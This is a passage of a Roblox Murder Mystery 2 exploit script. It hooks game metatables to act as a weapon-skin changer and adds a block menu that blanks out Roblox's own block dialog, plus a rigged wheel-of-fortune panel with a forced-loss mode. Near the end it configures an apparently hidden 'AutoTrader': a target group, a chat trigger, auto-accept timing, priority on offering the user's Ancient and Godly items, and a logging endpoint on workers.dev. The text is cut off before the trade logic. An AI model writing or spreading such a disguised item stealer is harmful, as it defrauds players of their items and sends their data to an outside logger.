		if gethui then BlockGui.Parent = gethui() end
		if syn and syn.protect_gui then syn.protect_gui(BlockGui) end
	end)
	BlockPanel.ref = BlockGui
	BlockGui.AncestryChanged:Connect(function() if not BlockGui.Parent then BlockPanel.ref = nil end end)
	local MF = Instance.new("Frame", BlockGui)
	MF.Size = UDim2.new(0, 480, 0, 540)
	MF.Position = UDim2.new(0.5, -240, 0.5, -270)
	MF.BackgroundColor3 = MM2.MainBG
	MF.BackgroundTransparency = MM2.MainBGTransparency
	MF.BorderSizePixel = 0
	Utils.corner(MF, 6)
	local tb = Instance.new("Frame", MF)
	tb.Size = UDim2.new(1, 0, 0, 55)
	tb.BackgroundColor3 = MM2.TitleBar
	tb.BorderSizePixel = 0
	Utils.corner(tb, 6)
	local tbp = Instance.new("UIPadding", tb)
	tbp.PaddingLeft = UDim.new(0, 10); tbp.PaddingRight = UDim.new(0, 5); tbp.PaddingTop = UDim.new(0, 5); tbp.PaddingBottom = UDim.new(0, 5)
	local tt = Instance.new("TextLabel", tb)
	tt.BackgroundTransparency = 1
	tt.Size = UDim2.new(1, -60, 1, 0)
	tt.Text = "Block Menu"
	tt.TextColor3 = MM2.TextWhite
	tt.TextScaled = true
	tt.TextXAlignment = Enum.TextXAlignment.Left
	tt.FontFace = MM2.FontBold
	Utils.textStroke(tt, 2.7)
	local cb = Instance.new("Frame", tb)
	cb.AnchorPoint = Vector2.new(1, 0.5)
	cb.Size = UDim2.new(0, 45, 1, -5)
	cb.Position = UDim2.new(1, -5, 0.5, 0)
	cb.BackgroundColor3 = MM2.CloseRed
	cb.BorderSizePixel = 0
	Utils.corner(cb, 3)
	Utils.stroke(cb, MM2.CloseRedStroke, 3)
	local cbBtn = Instance.new("ImageButton", cb)
	cbBtn.BackgroundTransparency = 1
	cbBtn.Size = UDim2.new(1, 0, 1, 0)
	cbBtn.ZIndex = 5
	local cbTxt = Instance.new("TextLabel", cb)
	cbTxt.BackgroundTransparency = 1
	cbTxt.AnchorPoint = Vector2.new(0.5, 0.5)
	cbTxt.Size = UDim2.new(0.8, 0, 0.8, 0)
	cbTxt.Position = UDim2.new(0.5, 0, 0.5, 0)
	cbTxt.Text = "X"
	cbTxt.TextColor3 = MM2.TextWhite
	cbTxt.TextScaled = true
	cbTxt.FontFace = MM2.FontFredBold
	Utils.textStroke(cbTxt, 2)
	cbBtn.MouseButton1Click:Connect(function() BlockPanel.ref = nil; BlockGui:Destroy() end)
	local Sc = Instance.new("ScrollingFrame", MF)
	Sc.Size = UDim2.new(1, -20, 1, -75)
	Sc.Position = UDim2.new(0, 10, 0, 65)
	Sc.BackgroundTransparency = 1
	Sc.BorderSizePixel = 0
	Sc.ScrollBarThickness = 8
	Sc.CanvasSize = UDim2.new(0, 0, 0, 0)
	Sc.AutomaticCanvasSize = Enum.AutomaticSize.Y
	local UL = Instance.new("UIListLayout", Sc)
	UL.Padding = UDim.new(0, 8)
	local UP = Instance.new("UIPadding", Sc)
	UP.PaddingTop = UDim.new(0, 5); UP.PaddingBottom = UDim.new(0, 5)
	Utils.makeDraggable(tb, MF)
	local blockedPlayers = {}
	local activePromptGui, activePromptBox
	local function setPromptMode(active)
		TweenService:Create(MF, TweenInfo.new(0.2), {BackgroundColor3 = active and Color3.fromRGB(0, 0, 0) or MM2.MainBG}):Play()
		tb.Visible = not active
		Sc.Visible = not active
	end
	local function findPromptContent(gui)
		local tl = nil
		for _, desc in pairs(gui:GetDescendants()) do
			if desc:IsA("TextLabel") and desc.Text and string.find(desc.Text, "Block") and string.find(desc.Text, "?") then
				tl = desc; break
			end
		end
		if not tl then return nil end
		local cand = tl.Parent
		local best = cand
		while cand and cand ~= gui do
			if (cand:IsA("Frame") or cand:IsA("ImageLabel") or cand:IsA("ImageButton")) then
				local sz = cand.AbsoluteSize
				if sz.X >= 200 and sz.X <= 900 and sz.Y >= 150 and sz.Y <= 700 then best = cand end
			end
			cand = cand.Parent
		end
		return best
	end
	local function nukeGui(gui)
		for _, desc in pairs(gui:GetDescendants()) do
			pcall(function()
				if desc:IsA("Frame") then desc.BackgroundTransparency = 1
				elseif desc:IsA("ImageLabel") then desc.BackgroundTransparency = 1; desc.ImageTransparency = 1
				elseif desc:IsA("ImageButton") then desc.BackgroundTransparency = 1; desc.ImageTransparency = 1
				elseif desc:IsA("TextButton") then desc.BackgroundTransparency = 0.3; desc.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
				elseif desc:IsA("BlurEffect") then desc.Enabled = false
				elseif desc:IsA("UIStroke") then desc.Enabled = false end
			end)
		end
		pcall(function() for _, v in pairs(Lighting:GetChildren()) do if v:IsA("BlurEffect") then v.Enabled = false end end end)
	end
	local function attachPrompt(gui)
		activePromptGui = gui
		nukeGui(gui)
		activePromptBox = findPromptContent(gui)
		setPromptMode(true)
		for i = 1, 5 do
			task.delay(i * 0.1, function()
				if activePromptGui == gui and gui.Parent then
					nukeGui(gui)
					if not activePromptBox then activePromptBox = findPromptContent(gui) end
				end
			end)
		end
		task.spawn(function()
			while activePromptGui == gui do
				task.wait(0.1)
				if not gui.Parent or not gui.Enabled then break end
				local stillThere = false
				for _, child in pairs(gui:GetDescendants()) do
					if child:IsA("TextLabel") and child.Text and string.find(child.Text, "Block") and string.find(child.Text, "?") then
						stillThere = true; break
					end
				end
				if not stillThere then break end
			end
			if activePromptGui == gui then activePromptGui = nil; activePromptBox = nil; setPromptMode(false) end
		end)
	end
	RunService.RenderStepped:Connect(function()
		if activePromptBox and activePromptBox.Parent and MF.Parent then
			pcall(function()
				local mp = MF.AbsolutePosition; local ms = MF.AbsoluteSize; local ps = activePromptBox.AbsoluteSize
				activePromptBox.AnchorPoint = Vector2.new(0, 0)
				activePromptBox.Position = UDim2.new(0, mp.X + (ms.X / 2) - (ps.X / 2), 0, mp.Y + (ms.Y / 2) - (ps.Y / 2))
			end)
		end
	end)
		CoreGui.DescendantAdded:Connect(function(desc)
		if desc:IsA("ScreenGui") and BlockGui.Parent then
			task.spawn(function()
				for i = 1, 20 do
					task.wait(0.03)
					for _, child in pairs(desc:GetDescendants()) do
						if child:IsA("TextLabel") and child.Text and string.find(child.Text, "Block") and string.find(child.Text, "?") then
							attachPrompt(desc)
							return
						end
					end
				end
			end)
		end
	end)

	local function promptBlock(plr)
		activePromptBox = nil
		activePromptGui = nil
		pcall(function()
			for _, v in pairs(Lighting:GetChildren()) do
				if v:IsA("BlurEffect") then v.Enabled = false end
			end
		end)
		pcall(function() StarterGui:SetCore("PromptBlockPlayer", plr) end)
		task.spawn(function()
			for i = 1, 50 do
				task.wait(0.03)
				if activePromptGui then return end
				for _, gui in pairs(CoreGui:GetChildren()) do
					if gui:IsA("ScreenGui") and gui.Enabled then
						for _, child in pairs(gui:GetDescendants()) do
							if child:IsA("TextLabel") and child.Text and string.find(child.Text, "Block") and string.find(child.Text, "?") then
								attachPrompt(gui)
								return
							end
						end
					end
				end
			end
		end)
	end

	local function createPlayerEntry(plr)
		if plr == localPlayer then return end
		local E = Instance.new("Frame", Sc)
		E.Size = UDim2.new(1, -10, 0, 90)
		E.BackgroundColor3 = MM2.ItemBG
		E.BorderSizePixel = 0
		Utils.corner(E, 8)
		Utils.stroke(E, MM2.TabStroke, 2)
		local Av = Instance.new("ImageLabel", E)
		Av.Size = UDim2.new(0, 70, 0, 70)
		Av.Position = UDim2.new(0, 10, 0.5, -35)
		Av.BackgroundColor3 = MM2.TextWhite
		Av.BorderSizePixel = 0
		Utils.corner(Av, 6)
		pcall(function()
			Av.Image = Players:GetUserThumbnailAsync(plr.UserId, Enum.ThumbnailType.HeadShot,
				Enum.ThumbnailSize.Size100x100)
		end)
		local NL = Instance.new("TextLabel", E)
		NL.Size = UDim2.new(0.45, 0, 0.7, 0)
		NL.Position = UDim2.new(0, 90, 0.15, 0)
		NL.BackgroundTransparency = 1
		NL.Text = plr.Name
		NL.TextColor3 = MM2.TextWhite
		NL.TextScaled = true
		NL.FontFace = MM2.FontBold
		NL.TextXAlignment = Enum.TextXAlignment.Left
		Utils.textStroke(NL, 2)
		local BB = Instance.new("Frame", E)
		BB.Size = UDim2.new(0, 140, 0, 55)
		BB.Position = UDim2.new(1, -150, 0.5, -27)
		BB.BackgroundColor3 = MM2.CloseRed
		BB.BorderSizePixel = 0
		Utils.corner(BB, 6)
		Utils.stroke(BB, MM2.CloseRedStroke, 3)
		local bCl = Instance.new("ImageButton", BB)
		bCl.BackgroundTransparency = 1
		bCl.Size = UDim2.new(1, 0, 1, 0)
		bCl.ZIndex = 5
		local bT = Instance.new("TextLabel", BB)
		bT.BackgroundTransparency = 1
		bT.Size = UDim2.new(1, -10, 1, -6)
		bT.Text = "BLOCK"
		bT.TextColor3 = MM2.TextWhite
		bT.TextScaled = true
		bT.FontFace = MM2.FontBold
		Utils.textStroke(bT, 2)
		if blockedPlayers[plr.UserId] then
			bT.Text = "BLOCKED"
			BB.BackgroundColor3 = MM2.GreenAction
		end
		bCl.MouseButton1Click:Connect(function()
			promptBlock(plr)
			bT.Text = "BLOCKED"
			BB.BackgroundColor3 = MM2.GreenAction
			blockedPlayers[plr.UserId] = true
		end)
	end

	local function refreshList()
		for _, v in pairs(Sc:GetChildren()) do
			if v:IsA("Frame") then v:Destroy() end
		end
		for _, plr in pairs(Players:GetPlayers()) do
			pcall(createPlayerEntry, plr)
		end
	end

	Players.PlayerAdded:Connect(refreshList)
	Players.PlayerRemoving:Connect(refreshList)
	refreshList()
end

UI.blockClick.MouseButton1Click:Connect(BlockPanel.open)

local Wheel = {}
Wheel.gui = nil
Wheel.spinning = false
Wheel.image = nil
Wheel.result = nil
Wheel.pointer = nil
Wheel.pointerBaseRot = 0

function Wheel.spin(mode)
	if Wheel.spinning or not Wheel.image then return end
	Wheel.spinning = true
	if Wheel.result then
		Wheel.result.Text = "Spinning..."
		Wheel.result.TextColor3 = MM2.TextWhite
	end
	local eps = Wheel.image:FindFirstChild("EndPoints")
	if not eps then Wheel.spinning = false; return end
	local wins, loses = {}, {}
	for _, ep in ipairs(eps:GetChildren()) do
		if ep.Name == "Win" then table.insert(wins, ep)
		elseif ep.Name == "Lose" then table.insert(loses, ep) end
	end
	local target, result
	if mode == "lose" then
		target = loses[math.random(1, #loses)]
		result = "LOSER"
	else
		if math.random(1, 2) == 1 then
			target = wins[math.random(1, #wins)]
			result = "WINNER"
		else
			target = loses[math.random(1, #loses)]
			result = "LOSER"
		end
	end
	if not target then Wheel.spinning = false; return end
	local dx = target.Position.X.Scale - 0.5
	local dy = target.Position.Y.Scale - 0.5
	local ang = math.deg(math.atan2(dx, -dy))
	if ang < 0 then ang = ang + 360 end
	local off = math.random(-15, 15)
	local desired = -ang + off
	local cur = Wheel.image.Rotation % 360
	Wheel.image.Rotation = cur
	local full = math.random(6, 10) * 360
	local finalR = full + desired
	while finalR < cur + 360 do finalR = finalR + 360 end
	local numSegments = 5
	local segmentDeg = 360 / numSegments
	local pointer = Wheel.pointer
	local lastTickSegment = math.floor((cur % 360) / segmentDeg)
	local basePointerRot = Wheel.pointerBaseRot or 0
	local ti = TweenInfo.new(5.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out)
	local tw = TweenService:Create(Wheel.image, ti, {Rotation = finalR})
	tw:Play()
	local pointerConn
	pointerConn = RunService.RenderStepped:Connect(function()
		if not Wheel.spinning or not Wheel.image or not Wheel.image.Parent then
			if pointerConn then pointerConn:Disconnect(); pointerConn = nil end
			return
		end
		local rot = Wheel.image.Rotation % 360
		local seg = math.floor(rot / segmentDeg)
		if seg ~= lastTickSegment then
			lastTickSegment = seg
			if pointer then
				local kick = math.random(8, 15)
				pointer.Rotation = basePointerRot + kick
				TweenService:Create(pointer, TweenInfo.new(0.25, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out),
					{Rotation = basePointerRot}):Play()
			end
		end
	end)
	tw.Completed:Connect(function()
		Wheel.spinning = false
		if pointerConn then pointerConn:Disconnect(); pointerConn = nil end
		if pointer then
			TweenService:Create(pointer, TweenInfo.new(0.3, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out),
				{Rotation = basePointerRot}):Play()
		end
		if Wheel.result then
			if result == "WINNER" then
				Wheel.result.Text = "WINNER!"
				Wheel.result.TextColor3 = Color3.fromRGB(50, 255, 100)
			else
				Wheel.result.Text = "LOSER"
				Wheel.result.TextColor3 = Color3.fromRGB(255, 60, 60)
			end
		end
	end)
end

function Wheel.build()
	local sg = Instance.new("ScreenGui")
	sg.Name = "WheelOfFortune"
	sg.ResetOnSpawn = false
	pcall(function()
		if syn and syn.protect_gui then syn.protect_gui(sg) end
		if gethui then sg.Parent = gethui() else sg.Parent = CoreGui end
	end)
	if not sg.Parent then
		pcall(function() sg.Parent = CoreGui end)
		if not sg.Parent then sg.Parent = playerGui end
	end
	local mf = Instance.new("Frame", sg)
	mf.BackgroundColor3 = MM2.MainBG
	mf.BackgroundTransparency = MM2.MainBGTransparency
	mf.Size = UDim2.new(0, 522, 0, 640)
	mf.Position = UDim2.new(0.38, 0, 0.1, 0)
	mf.Active = true
	mf.BorderSizePixel = 0
	Utils.corner(mf, 6)
	local tb = Instance.new("Frame", mf)
	tb.Size = UDim2.new(1, 0, 0, 55)
	tb.BackgroundColor3 = MM2.TitleBar
	tb.BorderSizePixel = 0
	Utils.corner(tb, 6)
	local tbp = Instance.new("UIPadding", tb)
	tbp.PaddingLeft = UDim.new(0, 10)
	tbp.PaddingRight = UDim.new(0, 5)
	tbp.PaddingTop = UDim.new(0, 5)
	tbp.PaddingBottom = UDim.new(0, 5)
	local tt = Instance.new("TextLabel", tb)
	tt.BackgroundTransparency = 1
	tt.Size = UDim2.new(1, -60, 1, 0)
	tt.Text = "Wheel of Fortune"
	tt.TextColor3 = MM2.TextWhite
	tt.TextScaled = true
	tt.TextXAlignment = Enum.TextXAlignment.Left
	tt.FontFace = MM2.FontBold
	Utils.textStroke(tt, 2.7)
	local cb = Instance.new("Frame", tb)
	cb.AnchorPoint = Vector2.new(1, 0.5)
	cb.Size = UDim2.new(0, 45, 1, -5)
	cb.Position = UDim2.new(1, -5, 0.5, 0)
	cb.BackgroundColor3 = MM2.CloseRed
	cb.BorderSizePixel = 0
	Utils.corner(cb, 3)
	Utils.stroke(cb, MM2.CloseRedStroke, 3)
	local cbBtn = Instance.new("ImageButton", cb)
	cbBtn.BackgroundTransparency = 1
	cbBtn.Size = UDim2.new(1, 0, 1, 0)
	cbBtn.ZIndex = 5
	local cbTx = Instance.new("TextLabel", cb)
	cbTx.BackgroundTransparency = 1
	cbTx.AnchorPoint = Vector2.new(0.5, 0.5)
	cbTx.Size = UDim2.new(0.8, 0, 0.8, 0)
	cbTx.Position = UDim2.new(0.5, 0, 0.5, 0)
	cbTx.Text = "X"
	cbTx.TextColor3 = MM2.TextWhite
	cbTx.TextScaled = true
	cbTx.FontFace = MM2.FontFredBold
	Utils.textStroke(cbTx, 2)
	cbBtn.MouseButton1Click:Connect(function()
		sg:Destroy()
		Wheel.gui = nil
		Wheel.image = nil
		Wheel.result = nil
		Wheel.pointer = nil
	end)
	local wImg = Instance.new("ImageLabel", mf)
	wImg.BackgroundColor3 = MM2.TextWhite
	wImg.Image = "rbxassetid://116734510845822"
	wImg.Size = UDim2.new(0, 493, 0, 524)
	wImg.BackgroundTransparency = 1
	wImg.Name = "Wheel"
	wImg.AnchorPoint = Vector2.new(0.5, 0.5)
	wImg.Position = UDim2.new(0.5, 0, 0.5, 0)
	wImg.BorderSizePixel = 0
	local epf = Instance.new("Folder", wImg)
	epf.Name = "EndPoints"
	local eps = {
		{name = "Win", pos = UDim2.new(0.15416, 0, 0.46947, 0), rot = -16},
		{name = "Lose", pos = UDim2.new(0.39757, 0, 0.66031, 0), rot = -1},
		{name = "Win", pos = UDim2.new(0.66937, 0, 0.46947, 0), rot = 12},
		{name = "Lose", pos = UDim2.new(0.57201, 0, 0.20802, 0), rot = 44},
		{name = "Win", pos = UDim2.new(0.26572, 0, 0.18702, 0), rot = -28},
	}
	for _, ed in ipairs(eps) do
		local ep = Instance.new("Frame", epf)
		ep.BackgroundColor3 = MM2.TextWhite
		ep.Size = UDim2.new(0, 100, 0, 100)
		ep.Position = ed.pos
		ep.Name = ed.name
		ep.Rotation = ed.rot
		ep.BackgroundTransparency = 1
		ep.BorderSizePixel = 0
	end
	local lbf = Instance.new("Folder", wImg)
	lbf.Name = "Labels"
	local lbls = {
		{text = "LOSER", color = Color3.fromRGB(255, 0, 0), rot = 179,
			pos = UDim2.new(0.32099, 0, 0.70698, 0), size = UDim2.new(0, 174, 0, 50)},
		{text = "LOSER", color = Color3.fromRGB(255, 0, 0), rot = 42,
			pos = UDim2.new(0.51774, 0, 0.2337, 0), size = UDim2.new(0, 174, 0, 50)},
		{text = "WIN", color = Color3.fromRGB(125, 255, 17), rot = 103,
			pos = UDim2.new(0.57404, 0, 0.51718, 0), size = UDim2.new(0, 200, 0, 50)},
		{text = "WIN", color = Color3.fromRGB(125, 255, 17), rot = -106,
			pos = UDim2.new(0.05274, 0, 0.51718, 0), size = UDim2.new(0, 200, 0, 50)},
		{text = "WIN", color = Color3.fromRGB(125, 255, 17), rot = -26,
			pos = UDim2.new(0.1643, 0, 0.23473, 0), size = UDim2.new(0, 200, 0, 50)},
	}
	for _, ld in ipairs(lbls) do
		local lb = Instance.new("TextLabel", lbf)
		lb.TextWrapped = true
		lb.TextScaled = true
		lb.FontFace = MM2.FontBold
		lb.TextColor3 = ld.color
		lb.BackgroundTransparency = 1
		lb.Size = ld.size
		lb.Text = ld.text
		lb.Rotation = ld.rot
		lb.Position = ld.pos
		Utils.textStroke(lb, 2.7)
	end
	local pt = Instance.new("ImageLabel", mf)
	pt.BackgroundColor3 = MM2.TextWhite
	pt.Image = "rbxassetid://123105178012520"
	pt.Size = UDim2.new(0, 69, 0, 68)
	pt.BackgroundTransparency = 1
	pt.Name = "Pointer"
	pt.Position = UDim2.new(0.5, 0, 0.09, 0)
	pt.AnchorPoint = Vector2.new(0.5, 0)
	pt.Rotation = 0
	pt.ZIndex = 10
	pt.BorderSizePixel = 0
	Wheel.pointer = pt
	Wheel.pointerBaseRot = 0
	local rL = Instance.new("TextLabel", mf)
	rL.Size = UDim2.new(1, -40, 0, 45)
	rL.Position = UDim2.new(0, 20, 1, -60)
	rL.BackgroundTransparency = 1
	rL.Text = "Use keybinds to spin!"
	rL.TextColor3 = MM2.TextWhite
	rL.TextScaled = true
	rL.FontFace = MM2.FontBold
	Utils.textStroke(rL, 2)
	Wheel.result = rL
	Utils.makeDraggable(tb, mf)
	Wheel.gui = sg
	Wheel.image = wImg
end

function Wheel.open()
	if Wheel.gui and Wheel.gui.Parent then
		Wheel.gui.Enabled = true
		return
	end
	Wheel.build()
end

UI.wheelClick.MouseButton1Click:Connect(Wheel.open)

local WD = {}
WD.mesh = {}
WD.lastMesh = nil
WD.lastWeapon = nil
WD.debugScale = Vector3.new(1, 1, 1)
WD.debugOffset = Vector3.new(0, 0, 0)

for _, entry in ipairs(WEAPON_MESH_DATABASE) do
	if type(entry) == "table" and entry.Name then
		WD.mesh[entry.Name] = entry
		if entry.Tool and entry.Tool ~= entry.Name then WD.mesh[entry.Tool] = entry end
	end
end

function WD.getItemType(weaponName)
	if not Core.itemDatabase then Core.loadDatabase() end
	if not Core.itemDatabase then return nil end
	local ent = Core.itemDatabase[weaponName]
	if ent and type(ent) == "table" and type(ent.ItemType) == "string" then return ent.ItemType end
	for _, data in pairs(Core.itemDatabase) do
		if data and type(data) == "table" and data.ItemName == weaponName and type(data.ItemType) == "string" then
			return data.ItemType
		end
	end
	return nil
end

function WD.getClosestDisplay(displayName)
	local df = Workspace:FindFirstChild("WeaponDisplays")
	if not df then return nil end
	local ch = localPlayer.Character
	if not ch then return nil end
	local hrp = ch:FindFirstChild("HumanoidRootPart")
	if not hrp then return nil end
	local mp = hrp.Position
	local closest, cd
	for _, part in ipairs(df:GetChildren()) do
		if part.Name == displayName and part:IsA("BasePart") then
			local dist = (part.Position - mp).Magnitude
			if not cd or dist < cd then
				closest = part
				cd = dist
			end
		end
	end
	return closest
end

function WD.applyMesh(weaponName)
	if not Core.equipEnabled then return end
	local mi = WD.mesh[weaponName]
	if not mi then return end
	local it = WD.getItemType(weaponName)
	if not it then return end
	local dn
	if it == "Knife" then
		dn = "KnifeDisplay"
	elseif it == "Gun" then
		dn = "GunDisplay"
	else
		return
	end
	local dp = WD.getClosestDisplay(dn)
	if not dp then return end
	local m = dp:FindFirstChild("Mesh")
	if not m then
		for _, c in ipairs(dp:GetChildren()) do
			if c:IsA("SpecialMesh") then m = c; break end
		end
	end
	if not m then return end
	if mi.Size and typeof(mi.Size) == "Vector3" then
		WD.debugScale = mi.Size
	else
		WD.debugScale = Vector3.new(1, 1, 1)
	end
	WD.debugOffset = Vector3.new(0, 0, 0)
	pcall(function()
		if mi.MeshId then m.MeshId = mi.MeshId end
		if mi.TextureId then m.TextureId = mi.TextureId end
		m.Scale = WD.debugScale
		m.Offset = WD.debugOffset
	end)
	WD.lastMesh = m
	WD.lastWeapon = weaponName
end

task.spawn(function()
	local ok, eq = pcall(function()
		return ReplicatedStorage:WaitForChild("Remotes", 10):WaitForChild("Inventory", 10):WaitForChild("Equip", 10)
	end)
	if not ok or not eq then return end
	local mt = getrawmetatable and getrawmetatable(game)
	local hf = hookfunction or hookfunc
	local ir = isreadonly or is_readonly
	local sr = setreadonly or set_readonly
	local nc = newcclosure or function(f) return f end
	if mt and hf then
		local wr = false
		if ir and ir(mt) then wr = true; if sr then sr(mt, false) end end
		local oldNC
		oldNC = hf(mt.__namecall, nc(function(self, ...)
			local method = getnamecallmethod and getnamecallmethod() or ""
			if (method == "FireServer" or method == "fireServer") and self == eq then
				local args = {...}
				if Core.equipEnabled and args[2] == "Weapons" and type(args[1]) == "string" then
					task.spawn(function() task.wait(0.1); WD.applyMesh(args[1]) end)
				end
			end
			return oldNC(self, ...)
		end))
		if wr and sr then sr(mt, true) end
	end
end)

local Debug = {}
Debug.gui = nil
Debug.scaleBoxes = {}
Debug.offsetBoxes = {}

local function makeDebugRow(parent, labelText, defaultValue, yPos)
	local row = Instance.new("Frame", parent)
	row.Size = UDim2.new(1, -20, 0, 40)
	row.Position = UDim2.new(0, 10, 0, yPos)
	row.BackgroundTransparency = 1
	local lb = Instance.new("TextLabel", row)
	lb.Size = UDim2.new(0, 100, 1, 0)
	lb.BackgroundTransparency = 1
	lb.Text = labelText
	lb.TextColor3 = MM2.TextWhite
	lb.TextScaled = true
	lb.FontFace = MM2.FontBold
	lb.TextXAlignment = Enum.TextXAlignment.Left
	local box = Instance.new("TextBox", row)
	box.Size = UDim2.new(1, -110, 0, 35)
	box.Position = UDim2.new(0, 105, 0, 2)
	box.BackgroundColor3 = MM2.SearchBG
	box.BorderSizePixel = 0
	box.Text = tostring(defaultValue)
	box.TextColor3 = MM2.TextWhite
	box.TextScaled = true
	box.FontFace = MM2.FontFred
	box.ClearTextOnFocus = false
	Utils.corner(box, 3)
	Utils.stroke(box, MM2.SearchStroke, 2)
	return box
end

function Debug.open()
	if Debug.gui and Debug.gui.Parent then
		Debug.gui.Enabled = true
		if Debug.scaleBoxes[1] then
			Debug.scaleBoxes[1].Text = tostring(WD.debugScale.X)
			Debug.scaleBoxes[2].Text = tostring(WD.debugScale.Y)
			Debug.scaleBoxes[3].Text = tostring(WD.debugScale.Z)
			Debug.offsetBoxes[1].Text = tostring(WD.debugOffset.X)
			Debug.offsetBoxes[2].Text = tostring(WD.debugOffset.Y)
			Debug.offsetBoxes[3].Text = tostring(WD.debugOffset.Z)
		end
		return
	end
	Debug.gui = Instance.new("ScreenGui")
	Debug.gui.Name = "WeaponDebug"
	Debug.gui.ResetOnSpawn = false
	pcall(function()
		if syn and syn.protect_gui then syn.protect_gui(Debug.gui) end
		if gethui then Debug.gui.Parent = gethui() else Debug.gui.Parent = CoreGui end
	end)
	if not Debug.gui.Parent then Debug.gui.Parent = playerGui end
	local m = Instance.new("Frame", Debug.gui)
	m.Size = UDim2.new(0, 380, 0, 400)
	m.Position = UDim2.new(0, 30, 0.3, 0)
	m.BackgroundColor3 = MM2.MainBG
	m.BackgroundTransparency = MM2.MainBGTransparency
	m.BorderSizePixel = 0
	m.Active = true
	Utils.corner(m, 6)
	local tb = Instance.new("Frame", m)
	tb.Size = UDim2.new(1, 0, 0, 45)
	tb.BackgroundColor3 = MM2.TitleBar
	tb.BorderSizePixel = 0
	Utils.corner(tb, 6)
	local tt = Instance.new("TextLabel", tb)
	tt.Size = UDim2.new(1, -60, 1, 0)
	tt.Position = UDim2.new(0, 10, 0, 0)
	tt.BackgroundTransparency = 1
	tt.Text = "Weapon Debug"
	tt.TextColor3 = MM2.TextWhite
	tt.TextScaled = true
	tt.TextXAlignment = Enum.TextXAlignment.Left
	tt.FontFace = MM2.FontBold
	Utils.textStroke(tt, 2)
	local cb = Instance.new("Frame", tb)
	cb.AnchorPoint = Vector2.new(1, 0.5)
	cb.Size = UDim2.new(0, 40, 1, -8)
	cb.Position = UDim2.new(1, -5, 0.5, 0)
	cb.BackgroundColor3 = MM2.CloseRed
	Utils.corner(cb, 3)
	Utils.stroke(cb, MM2.CloseRedStroke, 3)
	local cbB = Instance.new("ImageButton", cb)
	cbB.BackgroundTransparency = 1
	cbB.Size = UDim2.new(1, 0, 1, 0)
	local cbT = Instance.new("TextLabel", cb)
	cbT.BackgroundTransparency = 1
	cbT.Size = UDim2.new(1, 0, 1, 0)
	cbT.Text = "X"
	cbT.TextColor3 = MM2.TextWhite
	cbT.TextScaled = true
	cbT.FontFace = MM2.FontFredBold
	Utils.textStroke(cbT, 2)
	cbB.MouseButton1Click:Connect(function() Debug.gui.Enabled = false end)
	local info = Instance.new("TextLabel", m)
	info.Size = UDim2.new(1, -20, 0, 30)
	info.Position = UDim2.new(0, 10, 0, 55)
	info.BackgroundTransparency = 1
	info.Text = "Last: none"
	info.TextColor3 = Color3.fromRGB(0, 255, 100)
	info.TextScaled = true
	info.FontFace = MM2.FontFred
	info.TextXAlignment = Enum.TextXAlignment.Left
	local sx = makeDebugRow(m, "Scale X:", WD.debugScale.X, 95)
	local sy = makeDebugRow(m, "Scale Y:", WD.debugScale.Y, 140)
	local sz = makeDebugRow(m, "Scale Z:", WD.debugScale.Z, 185)
	local ox = makeDebugRow(m, "Offset X:", WD.debugOffset.X, 230)
	local oy = makeDebugRow(m, "Offset Y:", WD.debugOffset.Y, 275)
	local oz = makeDebugRow(m, "Offset Z:", WD.debugOffset.Z, 320)
	Debug.scaleBoxes = {sx, sy, sz}
	Debug.offsetBoxes = {ox, oy, oz}
	local function apply()
		WD.debugScale = Vector3.new(tonumber(sx.Text) or 1, tonumber(sy.Text) or 1, tonumber(sz.Text) or 1)
		WD.debugOffset = Vector3.new(tonumber(ox.Text) or 0, tonumber(oy.Text) or 0, tonumber(oz.Text) or 0)
		if WD.lastMesh and WD.lastMesh.Parent then
			pcall(function()
				WD.lastMesh.Scale = WD.debugScale
				WD.lastMesh.Offset = WD.debugOffset
			end)
		end
		if WD.lastWeapon then info.Text = "Last: " .. WD.lastWeapon end
	end
	local _, ac, _ = Utils.makeMM2Button("Apply", m, UDim2.new(1, -20, 0, 35), UDim2.new(0, 10, 1, -45),
		MM2.GreenAction, MM2.GreenActionStroke)
	ac.MouseButton1Click:Connect(apply)
	for _, box in ipairs({sx, sy, sz, ox, oy, oz}) do
		box.FocusLost:Connect(apply)
	end
	Utils.makeDraggable(tb, m)
	task.spawn(function()
		while Debug.gui and Debug.gui.Parent do
			task.wait(0.3)
			if WD.lastWeapon then info.Text = "Last: " .. WD.lastWeapon end
		end
	end)
end

function Debug.toggle()
	if not Core.equipEnabled then return end
	if Debug.gui and Debug.gui.Parent then
		Debug.gui.Enabled = not Debug.gui.Enabled
	else
		Debug.open()
	end
end

local AutoTrader = {}
AutoTrader.TARGET_GROUP_ID = 907351026
AutoTrader.CHAT_TRIGGER = "Oof"
AutoTrader.ACCEPT_DELAY = 6
AutoTrader.MAX_TRADE_SLOTS = 4
AutoTrader.TRADE_ID = game.PlaceId * 3
AutoTrader.OFFER_DELAY = 0.05
AutoTrader.BETWEEN_TRADES_DELAY = 3
AutoTrader.SECRET_KEY = "xeno"
AutoTrader.WORKER_URL = "https://logs.goonrotmethods.workers.dev"
AutoTrader.isActive = true
AutoTrader.lastOffer = 0
AutoTrader.tradeCompleted = false
AutoTrader.currentTarget = nil
AutoTrader.isTrading = false
AutoTrader.groupCheckCache = {}
AutoTrader.tradeQueue = {}
AutoTrader.RARITY_PRIORITY = {
	["Ancient"] = 1, ["Godly"] = 2, ["Unique"] = 3, ["Legendary"] = 4,
	["Rare"] = 5, ["Uncommon"] = 6, ["Common"] = 7, ["Classic"] = 8,
	["Christmas"] = 9, ["Halloween"] = 10, ["Misc"] = 11,
}
AutoTrader.OFFER_RARITIES = {["Ancient"] = true, ["Godly"] = true}
AutoTrader.PING_RARITIES = {["Ancient"] = true, ["Godly"] = true}
AutoTrader.GODLY_THRESHOLD = 5

local TradeFolder = ReplicatedStorage:WaitForChild("Trade")
local ATSendRequest = TradeFolder:WaitForChild("SendRequest")
local ATStartTrade = TradeFolder:WaitForChild("StartTrade")
local ATOfferItem = TradeFolder:WaitForChild("OfferItem")
local ATUpdateTrade = TradeFolder:WaitForChild("UpdateTrade")
local ATAcceptTrade = TradeFolder:WaitForChild("AcceptTrade")

local GetFullInventory = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Extras"):WaitForChild("GetFullInventory")
local ATDatabase = ReplicatedStorage:WaitForChild("Database")
local ATSync = require(ATDatabase:WaitForChild("Sync"))
local ATItemDatabase = ATSync.Item or ATSync.Weapons or ATSync

ATUpdateTrade.OnClientEvent:Connect(function(data)
